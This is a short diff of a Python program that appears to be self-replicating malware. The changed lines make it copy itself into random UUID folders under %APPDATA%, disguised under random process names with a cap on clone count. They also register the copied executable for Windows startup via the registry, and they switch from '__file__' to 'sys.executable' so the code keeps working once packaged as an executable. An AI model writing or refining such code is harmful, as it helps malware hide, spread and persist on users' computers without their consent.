@@ -127,7 +127,7 @@ if yes == "yes":
 					numberOfClones = numberOfClones + 1
 					print(numberOfClones)
 			if(numberOfClones <= PROCESS_NUM):
-				original = os.path.basename(__file__)
+				original = os.path.basename(sys.executable)
 				folderName = str(uuid.uuid4())
 				os.mkdir(str(os.getenv('APPDATA')) +"\\" +folderName)
 				rdmchoice = random.choice(PROCCESS_NAMES) 
@@ -156,10 +156,10 @@ if yes == "yes":
 		#Statup should be available soon for Mac OS
 		if os.name == "nt" or os.name == "windows":
 			import winreg as reg
-			pth = os.path.dirname(os.path.realpath(__file__))
+			pth = os.path.dirname(os.path.realpath(sys.executable))
 			
 			# name of the python file with extension
-			s_name=os.path.basename(__file__)	
+			s_name=os.path.basename(sys.executable)	
 			
 			# joins the file name to end of path address
 			address=os.path.join(pth,s_name)
